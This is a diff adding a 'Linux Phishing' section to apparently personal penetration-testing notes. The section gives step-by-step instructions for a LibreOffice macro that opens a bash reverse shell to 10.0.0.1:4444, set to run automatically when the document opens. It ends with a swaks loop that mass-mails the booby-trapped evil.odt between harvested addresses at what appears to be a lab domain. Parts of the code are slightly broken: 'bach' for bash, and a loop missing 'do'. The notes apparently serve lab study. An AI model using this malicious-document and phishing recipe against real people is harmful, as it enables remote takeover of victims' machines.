@@ -451,3 +451,71 @@ We could also have combined this technique with our previous Office macro attack
 ```bash
 Get-Process -Id 1234
 ```
+
+#### Linux Phishing
+
+
+LibreOffice Macros
+
+Last modified: 2023-09-09
+
+LibreOffice is an open-source office software alternative to Microsoft Word, Excel, etc. There are multiple applications such as Calc, Writer. Supported file extensions are also variety such as .odf, .odp, odt (OpenDocument), .odb (OpenOffice Base) etc.
+Create Macro to Code Execution
+
+Reference: https://jamesonhacking.blogspot.com/2022/03/using-malicious-libreoffice-calc-macros.html
+
+1. Create Macro
+
+We can create a macro and embed it into a LibreOffice file, like Microsoft Excel.
+
+```
+    Open one of the LibreOffice applications such as Calc, Writer.
+
+    Save a new empty file at first.
+
+    Go to Tools → Macros → Organize Macros → Basic. The BASIC Macros window opens.
+
+    In the window, select our new created filename in the left pane, then click New. Enter arbitrary module name and click OK. Macro editor (LibreOffice Basic) opens.
+
+    In the Macro editor, write our code as below. It’s an example for reverse shell.
+
+    REM  *****  BASIC  *****
+
+    Sub Main
+        Shell("bach -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'")
+    End Sub
+
+    Now close the editor.
+
+2. Embed the Macro to LibreOffice File.
+
+After creating a macro as above, next configure the macro to run immediately after opening this LibreOffice file.
+
+    Return to the original window on LibreOffice.
+
+    Go to Tools → Macros → Organize Macros → Basic again. The BASIC Macros window opens.
+
+    Select our new created macro (module) in the left pane. For example,
+
+    example.odt
+        - Standard
+            - Module1 <- select this
+
+Click Assign. The Customize window opens.
+
+In Customize window, go to Events tab. Then select Open Document and click 'Macro…'. The Macro Selector window opens.
+
+In the Macro Selector window, select our new created macro (module), then click OK.
+
+Now we should see the text such "Standard.Module1.Main" at the right of the Open Document. Click OK.
+
+Save this LibreOffice file again.
+
+Finally, we’ve created the file which is executed when the file opens.
+```
+
+```bash
+for name in $(cat valid.txt); for name2 in $(cat valid.txt); do echo "sudo swaks --to $name@postfish.off --from $name2@postfish.off --server postfish.off --attach @evil.odt --body 'smokum' --header 'Subject: king'" >> all-swaks.txt; done
+
+for line in $(cat all-swaks.txt); do echo $line|bash; done
+```
